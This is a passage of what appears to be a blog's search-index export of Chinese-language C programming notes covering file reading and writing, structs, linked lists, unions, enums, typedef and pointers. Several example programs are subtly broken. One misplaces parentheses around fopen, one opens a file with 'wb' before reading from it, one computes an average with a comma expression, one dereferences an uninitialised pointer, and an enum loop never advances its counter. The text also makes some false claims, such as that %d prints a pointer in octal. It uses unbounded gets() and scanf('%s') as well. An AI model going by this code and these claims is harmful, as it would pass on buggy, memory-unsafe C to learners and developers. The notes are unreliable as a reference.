outfile[10]; printf(\"输入读入文件的名字:\"); scanf(\"%s\", infile); printf(\"输入输出文件的名字:\"); scanf(\"%s\", outfile); getchar(); //用来消化最后输入的回车符 if ((in = fopen(infile, 'r') == NULL)) &#123; printf(\"cannot open file\\n\"); exit(0); &#125; if ((out = fopen(outfile, 'w') == NULL)) &#123; printf(\"cannot open file\\n\"); exit(0); &#125; ch = fgetc(in); while (!feof(in)) //如未遇到输入文件的结束标志 &#123; fputc(ch, out); putchar(ch); //显示在屏幕上 ch = fgetc(in); &#125; putchar(10); //显示完全部字符后换行 fclose(in); fclose(out); return 0;&#125; 在访问磁盘文件时,是逐个字符(字节)进行的,为了知道当前访问到第几个字节,系统用”文件读写位置标记”来表示当前所访问的位置.开始时指向第1个字节,每访问完一个字节,当前读写位置就指向下一个字节.为了知道对文件的读写是否完成,只需看文件读写位置是否移到文件的末尾. feof函数可以检测文件是否已被读取过. 怎样向文件读写一个字符串1fgets(str,n,fp); 作用是从fp所指向的文件中读入一个长度为n-1的字符串,并在最后加一个’\\0’字符,然后把这n个字符存放到字符数组str中. 读写一个字符串的函数 函数名 调用形式 功能 返回值 fgets fgets(str,n,fp) 从fp指向的文件读入一个长度为(n-1)的字符串,存放到字符数组str中. 读成功,返回地址str,失败则返回NULL fputs fputs(str,fp) 把str所指向的字符串写到文件指针变量fp所指向的文件中 输出成功,返回0;否则返回非0值 fgets函数的原型为： 1char *fgets(char * str,int n,FILE *fp); 作用是从文件读入一个字符串.调用时可以写成下面的形式: 1fgets(str,n,fp) n是要求得到的字符个数,但实际上只从fp所指向的文件中读入n-1字符,然后在最后加一个’\\0’字符,这样得到的字符串共有n个字符,把它们放到字符数组str中. 如果在读完n-1个字符之前遇到换行符’\\n’或文件结束符EOF,读入即结束,但将所遇到的换行符”\\n”也作为一个字符读入.执行成功返回值为str数组首元素的地址,如果一开始就遇到文件尾或读数据出错,则为NULL. fputs函数的原型为： 1char *fputs(char * str,FILE *fp); 其作用是将str所指向的字符串输出到fp所指向的文件中.调用时可以写成下面的形式: 1fputs(\"China\",fp); 第一个参数可以是字符串常量,字符数组名或字符型指针.字符串末尾的’\\0’不输出.输出成功,函数值为0,不成功则为EOF(-1). 从键盘读入若干个字符串,对它们按字母大小的顺序排序,然后把排好序的字符串送到磁盘文件中保存.12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123; FILE *fp; char str[3][10], temp[10]; int i, j, k, n = 3; printf(\"Enter strings:\\n\"); for (i = 0; i &lt; n; i++) gets(str[i]); for (i = 0; i &lt; n - 1; i++) //用选择法对字符串排序 &#123; k = i; for (j = i + 1; j &lt; n; j++) &#123; if (strcmp(str[k], str[j]) &gt; 0) k = j; if (k != i) &#123; strcpy(temp, str[i]); strcpy(str[i], str[k]); strcpy(str[k], temp); &#125; &#125; &#125; if ((fp = fopen(\"D:\\\\CC\\\\string.dat\", \"w\")) == NULL) &#123; printf(\"can't open file!\\n\"); exit(0); &#125; printf(\"\\nThe new sequence:\\n\"); for (i = 0; i &lt; n; i++) &#123; fputs(str[i], fp); fputs(\"\\n\", fp); printf(\"%s\", str[i]); &#125; fclose(fp); return 0;&#125; 用格式化的方式读写文本文件1234fprintf(文件指针,格式化字符串,输出表列);fscanf(文件指针,格式化字符串,输入表列);//从磁盘文件上读入ASCII字符---fprintf(fp,\"%d,%6.2f\",i,f); 因为在输入时要将文件中的ASCII码转换为二进制形式再保存在内存变量中,在输出时又要将内存中的二进制形式转换成字符,要花费更多的时间,因此,在内存与磁盘交换数据的情况下,最好不用fprintf和fscanf函数,而用fread和fwrite函数. 用二进制方式向文件读写一组数据允许用fread函数从文件读一个数据块,用fwrite函数向文件写一个数据块.在读写时以二进制形式进行的.在向磁盘写数据时,直接将内存中的一组数据原封不动,不加转换地复制到磁盘文件上,读入时也是将磁盘文件中若干字节的内容一批读入内存. 12fread(buffer,size,count,fp);fwrite(buffer,size,count,fp); buffer: fread:用来存放从文件读入的数据的存储区的地址 fwrite:把此地址开始的存储区中的数据向文件输出(指起始地址) size：要读的每个数据块的字节数count：要读的数据块的个数fp：文件指针 如: 12fread(f,4,10,fp);//f是一个float型数组名(代表数组首元素地址),从fp所指向的文件读入10个4个字节的数据,存储到数组f中 fread或fwrite执行成功返回count(输入或输出数据项的个数). 从键盘输入10个学生的有关数据,然后把它们转存到磁盘文件上.123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;#define SIZE 10struct Student_type&#123; char name[10]; int num; int age; char addr[15];&#125; stu[SIZE];void save()&#123; int i; FILE *fp; if ((fp = fopen(\"D:\\\\CC\\\\string.dat\", \"wb\")) == NULL)//二进制文件 &#123; printf(\"can't open file!\\n\"); exit(0); &#125; for (i = 0; i &lt; SIZE; i++) if ((fwrite(&amp;stu[i], sizeof(struct Student_type), 1, fp) != 1)) printf(\"file write error!\\n\"); fclose(fp);&#125;int main()&#123; void save(); int i; printf(\"Enter datas of student:\\n\"); for (i = 0; i &lt; SIZE; i++) scanf(\"%s %d %d %s\", stu[i].name, &amp;stu[i].num, &amp;stu[i].age, stu[i].addr); save(); return 0;&#125; 文本文件和二进制文件 数据的存储方式 ​ 文本方式: 数据以字符方式(ASCII代码)存储到文件中.如整数12,送到文件时占2个字节,而不是4个字节.以文本方式保存的数据便于阅读 ​ 二进制方式:数据按在内存的存储状态原封不动地复制到文件.如整数12,送到文件时和内存中一样占4个字节. 文件的分类 ​ 文本文件(ASCII文件):文件全部为ASCII字符 ​ 二进制文件:按二进制方式把在内存中的数据复制到文件的,称为二进制文件,即映像文件. 文件的打开方式 ​ 文本方式: 不带b的方式,读写文件时对换行符进行转换 ​ 文本方式: 带b的方式,读写文件时对换行符不进行转换 文件读写函数 ​ 文本读写函数:用来向文本文件读写字符数据的函数(如fgetc,fgets,fputc,fputs,fscanf,fprintf等) ​ 二进制读写函数:用来向二进制文件读写二进制数据的函数(如getw,putw,fread,fwrite等) 随机读写数据文件文件位置标记及其定位文件位置标记文件位置标记用来指示”接下来要读写的下一个字符的位置” 文件位置标记的定位:one: 用rewind函数使文件位置标记指向开头.同时feof函数的值会回复为0(假). 有一个磁盘文件,内有一些信息.要求第1次将它的内容显示在屏幕上,第2次把它复制到另一文件上.1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;int main()&#123; FILE *fp1, *fp2; char ch; fp1 = fopen(\"file1.dat\", \"r\"); //不含路径默认在源文件所在目录 fp2 = fopen(\"file2.dat\", \"w\"); ch = getc(fp1); while (!feof(fp1)) //或者 while(ch!=EOF) &#123; putchar(ch); ch = getc(fp1); &#125; putchar(10); rewind(fp1); ch = getc(fp1); while (!feof(fp1)) &#123; fputc(ch, fp2); ch = getc(fp1); &#125; fclose(fp1); fclose(fp2); return 0;&#125; :two:用fseek函数改变文件位置标记 1fseek(文件类型指针,位移量,起始点); 起始点: 起始点 名字 用数字代表 文件开始位置 SEEK_SET 0 文件当前位置 SEEK_CUR 1 文件末尾位置 SEEK_END 2 位移量:以”起始点”为基点,应是long型数据(在数字的末尾加一个字母L,就表示是long型); 1fseek(fp,100L,0);//将文件位置标记先前移到离文件开头100个字节处. :three:用ftell函数测定文件位置标记的当前位置. 函数得到流式文件中文件位置标记的当前位置.调用函数时出错(如不存在fp指向的文件),返回值为-1L. 随机读写在磁盘文件上存有10个学生的数据.要求将第1,3,5,7,9个学生数据输入计算机,并在屏幕上显示出来.12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;struct Student_type&#123; char name[10]; int num; int age; char addr[15];&#125; stu[10];int main()&#123; FILE *fp; int i; if ((fp = fopen(\"D:\\\\CC\\\\string.dat\", \"wb\")) == NULL) &#123; printf(\"can't open file!\\n\"); exit(0); &#125; for (i = 0; i &lt; 10; i += 2) &#123; fseek(fp, i * sizeof(struct Student_type), 0); fread(&amp;stu[i], sizeof(struct Student_type), 1, fp); printf(\"%-10s %4d %4d %-15s\\n\", stu[i].name, stu[i].num, stu[i].age, stu[i].addr); &#125; fclose(fp); return 0;&#125; 文件读写的出错检测检查输入输出函数调用时可能出现的错误. ferror函数 1ferror(fp); 如果返回值为0,表示未出现错误. 如果返回一个非零值,表示出错. 对同一个文件每一次调用输入输出函数,都会产生一个新的ferror函数值.因此在调用一个输入输出函数后立即检查ferror的值,否则信息会丢失. 在执行fopen函数时,ferror函数的初始值自动置为0. clearerr函数 使文件出错标记和文件结束标记置为0.","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://kayleh.top/tags/C/"}]},{"title":"users create data types themselves","slug":"9.users-create-data-types-themselves","date":"2020-10-25T09:18:07.000Z","updated":"2021-04-11T17:11:28.077Z","comments":true,"path":"users-create-data-types-themselves/","link":"","permalink":"https://kayleh.top/users-create-data-types-themselves/","excerpt":"","text":"用户自己建立数据类型定义和使用结构体变量由不同类型数据组成的组合型的数据结构，它称为结构体. 123456789struct Student &#123; int num; char name[20]; char sex; int age; float score; char addr[30]; &#125;; 声明结构体类型的一般形式 12345struct 结构体名 &#123;成员表列&#125;;结构体成员:类型名 成员名; 成员可以属于另一个结构体类型 123456789struct Date&#123; int month; int day; int year;&#125;struct Student&#123; struct Date birthday; //成员birthday属于struct Date类型&#125; 定义结构体类型变量先声明结构体类型,再定义该类型的变量.1struct Student student1,student2; 在声明类型的同时定义变量123456789struct Student&#123; int num; char name[20]; char sex; int age; float score; char addr[30];&#125; student1, student2; 1234struct 结构体名&#123; 成员表列&#125;变量名表列; 不指定类型名而直接定义结构体类型变量1234struct &#123; 成员表列&#125;变量名表列; 没有名字.显然不能再以此结构类型去定义其他变量. 对类型是不分配空间的,只对变量分配空间 结构体类型中的成员名可以与程序中的变量名相同,但二者不代表同一对象 结构体变量的初始化和引用把一个学生的信息(包括学号,姓名等)放在一个结构体变量中,然后输出这个学生的信息.123456789struct Student&#123; int num; char name[20]; char sex; char addr[30];&#125; a = &#123;10101, \"Li Lin\", 'M', \"123 Beijing Road\"&#125;;printf(\"No.:%ld\\nname:%s\\nsex:%c\\naddress:%s\\n\", a.num, a.name, a.sex, a.addr);return 0; C99标准允许对某一成员b.name.其他未被指定初始化的数值型成员被系统初始化为0.字符型成员被系统初始化为’\\0’,指针型成员被系统初始化为NULL 引用结构体变量中成员的值,引用方式为 1结构体变量名.成员名 .是成员运算符,在所有的运算符中优先级最高. 可以对变量的成员赋值. 同类的结构体变量可以互相赋值 1student1=student2; 输入两个学生的学号,姓名和成绩较高的学生的学号,姓名和成绩.1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;int main()&#123; struct Student &#123; int num; char name[20]; float score; &#125; student1, student2; printf(\"please enter student1 num,name,score:\\n\"); scanf(\"%d%s%f\", &amp;student1.num, student1.name, &amp;student1.score); printf(\"please enter student2 num,name,score:\\n\"); scanf(\"%d%s%f\", &amp;student2.num, student2.name, &amp;student2.score); if (student1.score &gt; student2.score) printf(\"No.:%ld\\nname:%s\\nscore:%c\\n\", student1.num, student1.name, student1.score); else if (student1.score &lt; student2.score) printf(\"No.:%ld\\nname:%s\\nscore:%c\\n\", student2.num, student2.name, student2.score); else &#123; printf(\"No.:%ld\\nname:%s\\nscore:%c\\n\", student1.num, student1.name, student1.score); printf(\"No.:%ld\\nname:%s\\nscore:%c\\n\", student2.num, student2.name, student2.score); &#125; return 0;&#125; 使用结构体数组定义结构体数组12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;string.h&gt;struct Person&#123; char name[20]; int count;&#125; leader[3] = &#123;\"Li\", 0, \"Zhang\", 0, \"Sun\", 0&#125;;int main()&#123; int i, j; for (i = 0; i &lt; 10; i++) &#123; char leader_name[20]; scanf(\"%s\", leader_name); for (j = 0; j &lt; 3; j++) if (strcmp(leader_name, leader[j].name) == 0) leader[j].count++; &#125; printf(\"\\nResult:\\n\"); for (i = 0; i &lt; 3; i++) printf(\"%5s:%d\\n\", leader[i].name, leader[i].count); return 0;&#125; 定义结构体数组一般形式① 12struct 结构体名&#123;成员表列&#125; 数组名[数组长度]; ②先声明一个结构体类型(如struct Person),然后再用此类型定义结构体数组 123结构体类型 数组名[数组长度]如:struct Person leader; 对结构体数组初始化的形式是在定义数组的后面加上 1=&#123;初值表列&#125;; 如: 1struct Person leader[3] = &#123;\"Li\", 0, \"Zhang\", 0, \"Sun\", 0&#125;; 有n个学生的信息(包括学号,姓名,成绩),要求按照成绩的高低顺序输出各学生的信息.1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;string.h&gt;struct Student&#123; int num; char name[20]; float score;&#125;;// 有n个学生的信息(包括学号,姓名,成绩),要求按照成绩的高低顺序输出各学生的信息.int main()&#123; struct Student stu[5] = &#123;&#123;10101, \"Zhang\", 78&#125;, &#123;10103, \"Wang\", 98.5&#125;, &#123;10106, \"Li\", 86&#125;, &#123;10108, \"Ling\", 73.5&#125;, &#123;10110, \"Sun\", 100&#125;&#125;; int i, j, k; struct Student temp; const int n = 5; for (i = 0; i &lt; n - 1; i++) &#123; k = i; for (j = i + 1; j &lt; n; j++) if (stu[j].score &gt; stu[k].score) k = j; temp = stu[k]; stu[k] = stu[i]; stu[i] = temp; &#125; for (i = 0; i &lt; n; i++) printf(\"%6d%8s%6.2f\\n\", stu[i].num, stu[i].name, stu[i].score); printf(\"\\n\"); return 0;&#125; 结构体指针指向结构体变量的指针指向结构体对象的指针变量既可指向结构体变量,也可指向结构体数组中的元素.指针变量的基类型必须与结构体变量的类型相同.如: 1struct Student *pt; //pt可以指向struct Student类型的变量或数组元素. 通过指向结构体变量的指针变量输出结构体变量中成员的信息123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main()&#123; struct Student &#123; long num; char name[20]; char sex; float score; &#125;; struct Student stu_1; struct Student *p; p = &amp;stu_1; stu_1.num = 10101; strcpy(stu_1.name, \"Li Lin\"); //stu_1.name = \"Li Lin\"; 非法,表达式必须是可修改的左值,stu_1.name是临时的值 stu_1.sex = 'M'; stu_1.score = 89.5; printf(\"No.:%ld\\nname:%s\\nsex:%c\\nscore:%5.1f\\n\", stu_1.num, stu_1.name, stu_1.sex, stu_1.score); printf(\"No.:%ld\\nname:%s\\nsex:%c\\nscore:%5.1f\\n\", (*p).num, (*p).name, (*p).sex, (*p).score); return 0;&#125; 如果p指向一个结构体变量stu,以下3种用法等价. stu.成员名( 如stu.num ) (p).成员名( 如(\\p).num ) p-&gt;成员名( 如p-&gt;num ) 指向结构体数组的指针 可以用指针变量指向结构体数组的元素 有3个同学的信息,放在结构体数组中,要求输出全部同学的信息.1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;string.h&gt;struct Student&#123; long num; char name[20]; char sex; int age;&#125;;struct Student stu[3] = &#123;&#123;10101, \"Zhang\", 'F', 1&#125;, &#123;10103, \"Wang\", 'M', 98&#125;, &#123;10106, \"Li\", 'F', 86&#125;&#125;;int main()&#123; struct Student *p; printf(\"No. Name sex age\\n\"); for (p = stu; p &lt; stu + 3; p++) //执行p++后p的值等于stu+1,p指向stu[1]a printf(\"%5d %-20s %2c %4d\\n\", p-&gt;num, p-&gt;name, p-&gt;sex, p-&gt;age); return 0;&#125; 用结构体变量和结构体变量的指针作函数参数将一个结构体变量的值传递给另一个函数，有3种方法： 用结构体变量的成员作参数. 用结构体变量作实参 用指向结构体变量(或数组元素)的指针作实参,将结构体变量(或数组元素)的地址传给形参 有n个结构体变量,内含学生学号,姓名和3门课程的成绩.要求输出平均成绩最高的学生的成绩(包括学号,姓名,3门课程绩和平均成绩).12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#define N 3struct Student&#123; long num; char name[20]; float score[3]; int aver;&#125;;// 有n个结构体变量,内含学生学号,姓名和3门课程的成绩.要求输出平均成绩最高的学生的成绩(包括学号,姓名,3门课程成绩和平均成绩).int main()&#123; void input(struct Student stu[]); struct Student max(struct Student stu[]); void print(struct Student stud); struct Student stu[N], *p = stu; input(p); print(max(p)); return 0;&#125;void input(struct Student stu[])&#123; int i; printf(\"请输出各学生的信息:学号,姓名,3门课成绩:\\n\"); for (i = 0; i &lt; N; i++) &#123; scanf(\"%d %s %f %f %f\", &amp;stu[i].num, stu[i].name, &amp;stu[i].score[0], &amp;stu[i].score[1], &amp;stu[i].score[2]); stu[i].aver = (stu[i].score[0], stu[i].score[1], stu[i].score[2]) / 3.0; &#125;&#125;struct Student max(struct Student stu[])&#123; int i, max = 0; for (i = 0; i &lt; N; i++) &#123; if (stu[i].aver &gt; stu[max].aver) max = i; &#125; return stu[max];&#125;void print(struct Student stud)&#123; printf(\"\\n成绩最高的学生是:\\n\"); printf(\"学生:%d\\n姓名:%s\\n三门课成绩:%5.1f,%5.1f,%5.1f\\n平均成绩:%6.2f\\n\", stud.num, stud.name, stud.score[0], stud.score[1], stud.score[2]);&#125; 用指针处理链表 链表中各元素在内存中的地址可以是不连续的，要找到某一元素，必须先找到上一个元素，根据它提供的下一个元素地址才能找到一个元素. 建立简单的静态链表由3个学生数据组成的结点组成，要求输出各结点的数据.123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;struct Student&#123; long num; float score; struct Student *next;&#125;;int main()&#123; struct Student a, b, c, *head, *p; a.num = 10101; a.score = 89.5; b.num = 10103; b.score = 90; c.num = 10107; c.score = 85; head = &amp;a; a.next = &amp;b; b.next = &amp;c; c.next = NULL; p = head; do &#123; printf(\"%ld %5.1f\\n\", p-&gt;num, p-&gt;score); p = p-&gt;next; &#125; while (p != NULL); return 0;&#125; 建立动态链表写一个函数建立一个有3名学生数据的单向动态链表12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define LEN sizeof(struct Student)struct Student&#123; long num; float score; struct Student *next;&#125;;int n;struct Student *create(void) //此函数返回一个指向链表头的指针&#123; struct Student *head; struct Student *p1, *p2; n = 0; //结点的个数 p1 = p2 = (struct Student *)malloc(LEN); scanf(\"%ld,%f\", &amp;p1-&gt;num, &amp;p1-&gt;score); head = NULL; while (p1-&gt;num != 0) &#123; n = n + 1; if (n == 1) head = p1; else p2-&gt;next = p1;//将新结点的地址赋给第1个结点的next成员 p2 = p1; //使p2指向刚才建立的结点。 p1 = (struct Student *)malloc(LEN);//开辟结点并使p1指向它 scanf(\"%ld,%f\", &amp;p1-&gt;num, &amp;p1-&gt;score); &#125; p2-&gt;next = NULL; return (head);&#125;int main()&#123; struct Student *pt; pt = create(); printf(\"\\nnum:%ld\\nsocre:%5.1f\\n\", pt-&gt;num, pt-&gt;score); //输入0,0表示结束 return 0;&#125; 输出链表将链表中各结点的数据依次输出print12345678910111213void print(struct Student *head)&#123; struct Student *p; printf(\"\\nNow,These %d records are:\\n\", n); if (head != NULL) &#123; do &#123; printf(\"\\nnum:%ld\\nsocre:%5.1f\\n\", p-&gt;num, p-&gt;score); p = p-&gt;next; &#125; while (p != NULL); &#125;&#125; 共用体类型定义: 1234union 共用体名&#123; 成员表列&#125;变量表列; 如 123456union Data&#123; int i; char ch; float f;&#125; a, b, c; 结构体和共用体的区别: 结构体变量所占用内存长度是各成员占的内存长度之和.每个成员分别占有其自己的内存单元. 共用体变量所占的内存长度等于最长的成员的长度. 引用共用体变量的方式12a.ch;a.i; 共用体类型数据的特点 同一内存段可以用来存放几种不同类型的成员,但在每一瞬间时只能存放其中一个成员,而不是同时存放几个.因为在每一瞬时,存储单元只能有唯一的内容,也就是说,在共用体变量中只能存放一个值. 可以对共用体变量初始化,但初始化表中只能有一个常量. 123456789101112#include &lt;stdio.h&gt;int main()&#123; union Data &#123; int i; char ch; float f; &#125; a = &#123;1, 'a', 1.5&#125;; //非法，不能初始化3个成员，它们占用同一段存储单元. union Data a = &#123;16&#125;; union Data a = &#123;.ch='j'&#125;;&#125; 共用体变量中起作用的成员是最后一次被赋值的成员，在对共用体变量中的一个成员赋值，原有变量存储单元中的值就取代。 共用体变量的地址和它的各成员的地址都是同一地址。例如： 1&amp;a.i,&amp;a.c,&amp;a.f都是同一值. 不能对共用体变量赋值,也不能企图引用变量名来得到一个值. 1234a=1;//非法int m=a;//非法C99允许同类型的共用体变量互相赋值.如:b=a;//a和b是同一类型的共同体变量 C99允许用共同体变量作函数参数. 共同体类型可以出现在结构体类型定义中,也可以定义共用体数组. 结构体也可以出现在共用体类型定义中,数组也可以作为共用体的成员 有若干个人员的数据,其中有学生和教师.学生的数据中包括:姓名,号码,性别,职业,班级.教师的数据包括:姓名,号码,性别,职业,职务.要求用同一个表格来处理.123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;struct&#123; int num; char name[10]; char sex; char job; union &#123; int clas; //班级 char position[10]; //职务 &#125; category; //共用体变量&#125; person[2]; //结构体数组int main()&#123; int i; for (i = 0; i &lt; 2; i++) &#123; printf(\"please enter the data of person:\\n\"); scanf(\"%d %s %c %c\", &amp;person[i].num, &amp;person[i].name, &amp;person[i].sex, &amp;person[i].job); if (person[i].job == 's') scanf(\"%d\", &amp;person[i].category.clas); //如是学生输入班级 else if (person[i].job == 't') scanf(\"%d\", &amp;person[i].category.position); //如是老师输入职务 else printf(\"Input error!\"); &#125; printf(\"\\n\"); printf(\"No. name sex job class/position\\n\"); for (i = 0; i &lt; 2; i++) &#123; if (person[i].job == 's') printf(\"%-6d%-10s%-4c%-4c%-10d\\n\", person[i].num, person[i].name, person[i].sex, person[i].job, person[i].category.clas); else printf(\"%-6d%-10s%-4c%-4c%-10d\\n\", person[i].num, person[i].name, person[i].sex, person[i].job, person[i].category.position); &#125; return 0;&#125; 使用枚举类型如果一个变量只有几种可能的值,则可以定义为枚举(enumeration)类型,所谓”枚举”就是把可能的值一一列举出来,变量的值只限于列举出来的值的范围内. 定义如: 12345678910enum Weekday&#123; sun, mon, tue, wed, thu, fri, sat&#125;; 用此类型来定义变量 1enum Weekday workday, weekend; workday, weekend被定义为枚举变量，花括号中的 sun,mon,tue,wed,thu,fri,sat称为枚举元素或枚举常量。 声明枚举类型的一般形式为： 1enum [枚举名]&#123;枚举元素列表&#125;; 说明 C编译器对枚举类型的枚举元素按常量处理 每个枚举元素都代表一个整数,按定义时的顺序,默认为0,1,2,3…. 也可以人为地指定枚举元素的数值 12345678910enum Weekday &#123; sun=7, mon=1, tue, wed, thu, fri, sat &#125;; 以后的顺序加1,sat为6. 枚举元素可以用来作判断比较. 1if(workday==mon)... 口袋中有红,黄,蓝,白,黑5种颜色的球若干个.每次从口袋中先后取出3个球,问得到3种不同颜色的球的可能取法,输出每种排列的情况.12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;int main()&#123; // 口袋中有红,黄,蓝,白,黑5种颜色的球若干个.每次从口袋中先后取出3个球,问得到3种不同颜色的球的可能取法,输出每种排列的情况. enum Color &#123; red, yellow, blue, white, black &#125;; enum Color i, j, k, pri; int n, loop; n = 0; for (i = red; i &lt;= black; i++) //第一个球 for (j = red; j &lt;= black; j++) //第二个球 if (i != j) for (k = red; k &lt;= black; k++) //第三个球 &#123; if ((k != j) &amp;&amp; (k != i)) &#123; n++; printf(\"%-4d\", n); //输出当前是第几个符合条件的组合 for (loop = 1; loop &lt;= 3; i++) //先后对3个球分别处理 &#123; switch (loop) &#123; case 1: pri = i; break; case 2: pri = j; case 3: pri = k; default: break; &#125; switch (pri) &#123; case red: printf(\"%-10s\", \"red\"); break; case yellow: printf(\"%-10s\", \"yellow\"); break; case blue: printf(\"%-10s\", \"blue\"); break; case white: printf(\"%-10s\", \"white\"); break; case black: printf(\"%-10s\", \"black\"); break; default: break; &#125; &#125; printf(\"\\n\"); &#125; &#125; printf(\"\\nTotal:%5d\\n\", n); return 0;&#125; 用typedef声明新类型名简单地用一个新的类型名代替原有的类型名。 12typedef int Integer;Integer i, j; //作用与int相同 命名一个简单的类型名代替复杂的类型表示方法 命名一个新的类型名代表结构体类型 123456789typedef struct&#123; int month; int day; int year;&#125; Date; Date birthday;Date *p; 代表数组类型 12typedef int Num[10];Num a; 代表指针类型 12typedef char *String;String p, s[10];//p为字符指针变量,s为字符指针数组 代表指向函数的指针类型 12typedef int (*Pointer)();Pointer p1, p2; typedef和#define表面上有相似之处123typedef int Count;和#define Count int; define是在预编译时处理的.它只能做简单的字符串替换而typedef是在编译阶段处理的,采用如同定义变量的方法那样先生成一个类型名,然后用它去定义变量. 当不同源文件中用到同一类型数据,常用typedef声明一些数据类型. 使用typedef名称有利于程序的通用和移植.有的计算机系统int型数据占用不一样,需要修改: 123typedef int Integer;修改为:typedef long Integer;","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://kayleh.top/tags/C/"}]},{"title":"Good use of pointers","slug":"Good-use-of-pointers","date":"2020-10-25T09:18:07.000Z","updated":"2021-04-11T17:11:28.148Z","comments":true,"path":"Good-use-of-pointers/","link":"","permalink":"https://kayleh.top/Good-use-of-pointers/","excerpt":"","text":"善于利用指针 Good use of pointers 指针如果在程序中定义了一个变量，在对程序进行编译时，系统就会给这个变量分配内存单元。编译系统根据程序中定义的变量类型，分配一定长度的空间。 每一个字节都有一个编号，就是“地址”。 地址指向该变量单元.地址形象化地称为”指针”,它能找到以它为地址的内存单元. c语言中的地址包括位置信息(内存编号,或称为纯地址)和它指向的数据的类型信息,或者说它是”带类型的地址”. 在程序中一般通过变量名来引用变量的值, 1printf(\"%d\\n\",i); 对变量的访问都是通过地址进行的. 假如有输入语句: 1scanf(\"%d\",&amp;i); 在执行时,把键盘输入的值送到地址为2000开始的整型存储单元中. 如果有语句: 1k=i+j; 则从2000~2003字节取出i的值(3),再从2004~2007字节取出j的值(6),将它们相加后再将其和(9)送到k所占用的2008~2011字节单元中.这种直接按变量名进行的访问称为”直接访问” 还可以采用另一种称为“间接访问”的方式，即将变量i的地址存放在另一变量中，然后通过该变量来找到变量i的地址。从而访问i变量。 为了表示将数值3送到变量中，可以有两种表达方式： 1) 将3直接送到变量i所标识的单元中,例如”i=3;” 2) 将3送到变量i_pointer所指向的单元(即变量i的存储单元)，例如“i_pointer=3;”,其中*i_pointer表示i_pointer所指向的对象， 指向通过i_pointer能知道i的地址，从而找到变量i的内存单元。 i_pointer指向i 指针变量通过指针变量访问整型变量.123456789101112131415#include&lt;stdio.h&gt;int main()&#123; int a = 100, b = 10; //定义整型变量a,b,并初始 int *point_1, *point_2; //定义指向整型数据的指针变量point_1,point_2 point_1 = &amp;a; //把变量a的地址赋给指针变量point_1 point_2 = &amp;b; printf(\"a=%d,b=%d\\n\", a, b); printf(\"*point_1=%d,*point_2=%d\\n\", *point_1, *point_2); return 0;&#125;-----a=100,b=10*point_1=100,*point_2=10 怎么定义指针变量1类型名 * 指针变量名 指针变量是基本数据类型派生出来的类型,它不能离开基本类型而独立存在. 怎样引用指针变量1)给指针变量赋值 1p=&amp;a; 指针变量p的值是变量a的地址,p指向a. 2)引用指针变量指向的变量. 1printf(\"%d\",*p); 以整数形式输出指针变量p所指向的变量的值,即变量a的值. 3)引用指针变量的值 1printf(\"%d\",p); 以八进制数形式输出指针变量p的值，如果p指向了a，就是输出了a的地址，&amp;a. 输入a和b两个整数，按先大后小的顺序输出。123456789101112131415161718#include&lt;stdio.h&gt;int main()&#123; int a, b, *point_a, *point_b, *temp; printf(\"please enter two integer number:\"); scanf(\"%d,%d\", &amp;a, &amp;b); point_a = &amp;a; point_b = &amp;b; if (a &lt; b) &#123; temp = point_b; point_b = point_a; point_a = temp; &#125; printf(\"a=%d,b=%d\\n\", a, b); printf(\"max=%d,min=%d\\n\", *point_a, *point_b);&#125; 指针变量作为函数参数:heavy_check_mark: 输入a和b两个整数，按先大后小的顺序输出。12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;int main()&#123; int a, b, *point_a, *point_b; void swap(int *point_a, int *point_b); printf(\"please enter two integer number:\"); scanf(\"%d,%d\", &amp;a, &amp;b); point_a = &amp;a; point_b = &amp;b; if (a &lt; b) swap(point_a, point_b); printf(\"max=%d,min=%d\\n\", *point_a, *point_b);&#125;void swap(int *point_a, int *point_b)&#123; int temp; temp = *point_a; *point_a = *point_b; *point_b = temp;&#125;----------------//如果写成: int *temp; *temp = *point_a;//此语句有错误,不能向一个未知的存储单元赋值. point_a = *point_b; point_b = *temp; 由于”单向传递“的值传递方式，形参值的改变不能使实参的值随之改变. 为了使在函数中改变了的变量值能被主调函数main所用,不能采取把改变值的变量作为参数的办法, 而应该用指针变量作为函数的参数,使指针变量所指向的变量值发生变化,在函数调用结束后,这些变量值的变化依然保留了下来. ——————有关值传递请看：值传递—————————————————————————— :x:不可以通过执行调用函数来改变实参指针变量的值,但是可以改变实参指针变量所指变量的值:123456789void swap(int *point_a, int *point_b)&#123; int *temp; temp = point_a; point_a = point_b; point_b = temp;&#125;------×无法改变 通过指针引用数组 数组元素的指针就是数组元素的地址 可以用一个指针变量指向一个数组元素.如: 12345int a[10]=&#123;1,3,5,7,9,11,13,15,17,19&#125;;int *p;p=&amp;a[0];//也可以写成p=a;指针变量p的值是数组a首元素即a[0]的地址.而不是数组a各元素的值. 在引用数组元素时指针的运算. 指针变量p指向数组元素a[0],希望用p+1表示指向下一个元素a[1]; 系统会根据指针变量的基类型来确定增加的字节数. 如: 整型类型的指针变量int *p, p+1就是位移一个数组元素(int)所占用的字节数也就是4. 如果p的初值为&amp;a[0],则p+i和a+i就是数组元素a[i]的地址. *(p+i)或*(a+i)是p+i或a+i就是数组元素,即a[i]. 实际上编译系统在编译时,对数组元素a[i]就是按*(a+i)处理的.即按数组首字母的地址加上相对位移量得到要找的元素的地址,然后找出该单元中的内容. [ ]实际上是变址运算符,即将a[i]按a+i计算地址,然后找出此地址单元中的值. 